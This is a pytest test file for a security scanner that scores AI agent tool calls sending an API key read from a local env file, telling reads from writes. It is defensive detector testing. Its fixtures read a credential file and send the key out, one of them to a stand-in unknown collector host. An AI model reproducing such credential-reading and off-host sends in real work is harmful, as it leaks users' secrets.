"""A key sent only to its own service, by code that shows no write, scores as a read.

Where the credential-home check holds (the key comes from the agent's env file and goes only to a host that issued
it), the plain send of that call takes the read weight for irreversibility (`send_read`) unless the call visibly
writes: a PUT, PATCH or DELETE; a POST or a body sent to a path that is not read-shaped, where both are written as
literals (a full URL, or a helper call such as `req('POST', 'pages', ...)`); or a file uploaded. A helper whose
method and path are its parameters is read as a read: the judge's own irreversibility and the score cover it. Reach
stays the send's. A call where the check fails, or with no key at all, is scored as before.
"""

from __future__ import annotations

import pytest
from test_aira_detectors import planir
from test_converge_scan import BENIGN_ANSWERS, CLOCK, KEY
from test_jev_probes import FakeDecider
from test_session_sets import seed

from sentrook.converge import load_params
from sentrook.scan import Scanner, ScannerConfig, ScanOptions

V8 = load_params("conv-v8")
ENV = "/home/me/.hermes/.env"
HOST = "api.example.invalid"
HOME = {
    "kind": "host",
    "value": HOST,
    "verdict": "known_good",
    "tier": "provider_api",
    "roles": ["data_destination", "data_source"],
    "credential_names": ["EXAMPLE_API_KEY"],
}
ORACLE = {"entities": [HOME]}
HELD = seed(holds_sensitive=True, sensitive_entities=[ENV])
REQUEST = "Check my example workspace for open items."

READ_KEY = (
    "import os, json, urllib.request\n"
    "env=open(os.path.expanduser('~/.hermes/.env')).read()\n"
    "key=[l.split('=',1)[1].strip() for l in env.splitlines() if l.startswith('EXAMPLE_API_KEY=')][0]\n"
)
#: The agent's usual helper: method, path and body are its parameters.
HELPER = (
    "def req(m, p, b=None):\n"
    f"    r=urllib.request.Request('https://{HOST}/v1/'+p, method=m,"
    " data=json.dumps(b).encode() if b else None,"
    " headers={'Authorization':'Bearer '+key,'Content-Type':'application/json'})\n"
    "    return json.load(urllib.request.urlopen(r))\n"
)
SCRATCH = "os.makedirs(os.path.expanduser('~/.agent/cache/scratch'), exist_ok=True)\n"


def scan(
    src: str,
    *,
    tool: str = "execute_code",
    oracle: dict | None = None,
    request: str = REQUEST,
    state: dict | None = None,
):
    args = {"code": src} if tool == "execute_code" else {"command": src}
    raw = planir(tool, "exec", args, platform="hermes", request=request)
    scanner = Scanner(ScannerConfig(token_key=KEY, decider=FakeDecider(BENIGN_ANSWERS), params=V8))
    return scanner.scan(
        raw,
        ScanOptions(
            deterministic=True,
            clock=CLOCK,
            salt="testnest",
            state_seed=state if state is not None else HELD,
            oracle_seed=oracle if oracle is not None else ORACLE,
        ),
    )


def send_weights(res) -> dict[str, float]:
    """AIRA's plain-send contributions: signal -> value."""
    aira = next(e for e in res.envelopes if e.step.value == "aira")
    return {
        c.signal.split(".")[-1]: c.value for c in aira.contributions if c.reason == "send.off_host"
    }


def assert_read(res) -> None:
    assert res.prepared.credential_home_check == "ok"
    w = send_weights(res)
    assert w["irreversibility"] == pytest.approx(0.1)
    assert w["reach"] == pytest.approx(1.0)  # still a send off the machine


def assert_send(res) -> None:
    assert send_weights(res)["irreversibility"] == pytest.approx(0.8)


# --------------------------------------------------------------------------- must stay silent (a read)


def test_a_helper_whose_method_and_path_are_parameters_reads():
    src = (
        READ_KEY
        + HELPER
        + "db=req('GET','databases/569e308b')\n"
        + "rows=req('POST', f\"data_sources/{db['id']}/query\", {'page_size':100})['results']\n"
        + SCRATCH
        + "json.dump(rows, open(os.path.expanduser('~/.agent/cache/scratch/board.json'),'w'))\n"
        + "print(len(rows))\n"
    )
    res = scan(src)
    assert_read(res)
    assert res.response.risk < 45


def test_a_plain_get_of_a_page_reads():
    src = (
        READ_KEY + f"r=urllib.request.Request('https://{HOST}/v1/pages/4139ad2f/markdown',"
        " headers={'Authorization':'Bearer '+key})\n"
        + "print(json.load(urllib.request.urlopen(r))['markdown'][:2000])\n"
    )
    assert_read(scan(src))


def test_a_get_whose_id_comes_from_a_local_cache_reads():
    src = (
        READ_KEY
        + "rows=json.load(open(os.path.expanduser('~/.agent/cache/scratch/board.json')))\n"
        + "for d in rows[:3]:\n"
        + f"    r=urllib.request.Request(f'https://{HOST}/v1/pages/{{d[\"id\"]}}/markdown',"
        " headers={'Authorization':'Bearer '+key})\n"
        + "    print(json.load(urllib.request.urlopen(r))['markdown'][:500])\n"
    )
    assert_read(scan(src))


def test_requests_get_is_no_send_at_all():
    """`requests.get` is not a send sink in the first place: unchanged, and nothing to discount."""
    src = (
        "import os, requests\n"
        "key=[l.split('=',1)[1].strip() for l in open(os.path.expanduser('~/.hermes/.env'))"
        " if l.startswith('EXAMPLE_API_KEY=')][0]\n"
        f"r=requests.get('https://{HOST}/v1/users/me', headers={{'Authorization':'Bearer '+key}})\n"
        "print(r.json())\n"
    )
    res = scan(src)
    assert res.prepared.credential_home_check == "ok"
    assert "irreversibility" not in send_weights(res)


def test_a_post_to_a_literal_read_shaped_path_reads():
    src = (
        READ_KEY
        + f"r=urllib.request.Request('https://{HOST}/v1/search', data=json.dumps({{'query':'x'}}).encode(),"
        " headers={'Authorization':'Bearer '+key})\n"
        + "print(json.load(urllib.request.urlopen(r)))\n"
    )
    assert_read(scan(src))


# --------------------------------------------------------------------------- must fire (a send)


@pytest.mark.parametrize(
    "call",
    [
        "req('POST','pages',{'parent':{'page_id':'x'},'children':[]})",
        "req('POST', \"pages\", {'properties':{}})",
        "req('PATCH', f'pages/{pid}', {'archived':True})",
        "req('DELETE', f'blocks/{pid}')",
    ],
)
def test_a_helper_call_that_writes_is_a_send(call):
    src = READ_KEY + HELPER + "pid='4139ad2f'\n" + call + "\n"
    assert_send(scan(src))


def test_requests_post_to_a_page_is_a_send():
    src = (
        "import os, requests\n"
        "key=[l.split('=',1)[1].strip() for l in open(os.path.expanduser('~/.hermes/.env'))"
        " if l.startswith('EXAMPLE_API_KEY=')][0]\n"
        f"requests.post('https://{HOST}/v1/pages', json={{'properties':{{}}}},"
        " headers={'Authorization':'Bearer '+key})\n"
    )
    assert_send(scan(src))


def test_a_request_with_a_body_to_a_literal_write_path_is_a_send():
    src = (
        READ_KEY
        + f"r=urllib.request.Request('https://{HOST}/v1/pages', data=json.dumps({{'x':1}}).encode(),"
        " headers={'Authorization':'Bearer '+key})\n" + "urllib.request.urlopen(r)\n"
    )
    assert_send(scan(src))


def test_a_put_is_a_send():
    src = (
        READ_KEY + f"r=urllib.request.Request('https://{HOST}/v1/blocks/x', method='PUT',"
        " headers={'Authorization':'Bearer '+key})\n" + "urllib.request.urlopen(r)\n"
    )
    assert_send(scan(src))


def test_curl_posting_to_a_page_is_a_send():
    cmd = (
        "set -a; . ~/.hermes/.env; set +a; "
        f'curl -s -X POST -H "Authorization: Bearer $EXAMPLE_API_KEY" https://{HOST}/v1/pages '
        "-d '{\"properties\":{}}'"
    )
    res = scan(cmd, tool="terminal")
    assert res.prepared.credential_home_check == "ok"
    assert_send(res)


def test_a_key_sent_to_an_unlisted_host_keeps_its_weight():
    src = READ_KEY + HELPER.replace(HOST, "collector.unknown.invalid") + "req('GET','users/me')\n"
    res = scan(src)
    assert res.prepared.credential_home is None
    assert send_weights(res).get("irreversibility", 0.8) >= 0.8 or res.response.floors_applied


def test_a_get_in_code_with_no_key_keeps_its_weight():
    """No credential home: the change does not reach plain code requests elsewhere."""
    src = (
        "import json, urllib.request\n"
        "print(json.load(urllib.request.urlopen('https://status.example.invalid/v1/pages/x/markdown')))\n"
    )
    other = {**HOME, "value": "status.example.invalid", "credential_names": []}
    res = scan(src, oracle={"entities": [other]}, state=seed())
    assert res.prepared.credential_home is None
    assert_send(res)
